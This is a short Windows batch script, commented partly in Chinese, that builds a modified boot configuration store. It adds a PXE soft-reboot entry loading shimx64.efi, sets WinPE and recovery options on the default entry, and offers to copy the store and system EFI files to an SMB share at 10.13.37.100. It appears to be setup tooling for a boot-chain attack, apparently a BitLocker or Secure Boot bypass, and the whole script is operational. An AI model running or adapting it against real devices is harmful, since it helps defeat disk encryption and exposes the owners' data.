@echo off

bcdedit /export BCD_modded

bcdedit /store BCD_modded /create /d "softreboot" /application startup>GUID.txt
For /F "tokens=2 delims={}" %%i in (GUID.txt) do (set REBOOT_GUID=%%i)
del GUID.txt

bcdedit /store BCD_modded /set {%REBOOT_GUID%} path "\shimx64.efi"
bcdedit /store BCD_modded /set {%REBOOT_GUID%} device boot
bcdedit /store BCD_modded /set {%REBOOT_GUID%} pxesoftreboot yes

bcdedit /store BCD_modded /set {default} recoveryenabled yes
bcdedit /store BCD_modded /set {default} recoverysequence {%REBOOT_GUID%}
bcdedit /store BCD_modded /set {default} path "\\"
bcdedit /store BCD_modded /set {default} winpe yes

bcdedit /store BCD_modded /displayorder {%REBOOT_GUID%} /addlast


setlocal
:PROMPT
SET /P AREYOUSURE=Do you want to move the file to the SMB server on 10.13.37.100 (Y/[N])?
IF /I "%AREYOUSURE%" NEQ "Y" GOTO END

move BCD_modded S:\Boot\BCD

:: 复制系统 EFI 文件夹内容到 SMB 路径（创建目标目录如不存在）
robocopy %~d0\Windows\Boot\EFI\ S:\EFI\Microsoft\Boot /E /XC /XN /XO
:: 用新的 bootmgfw.efi 覆盖 S:\EFI\Microsoft\Boot 中的对应文件
:: copy /Y S:\bootmgfw.efi S:\EFI\Microsoft\Boot\bootmgfw.efi

goto :EOF

:END

move BCD_modded C:\BCD
echo "BCD file was moved to C:\BCD"

goto :EOF

endlocal

:EOF

pause
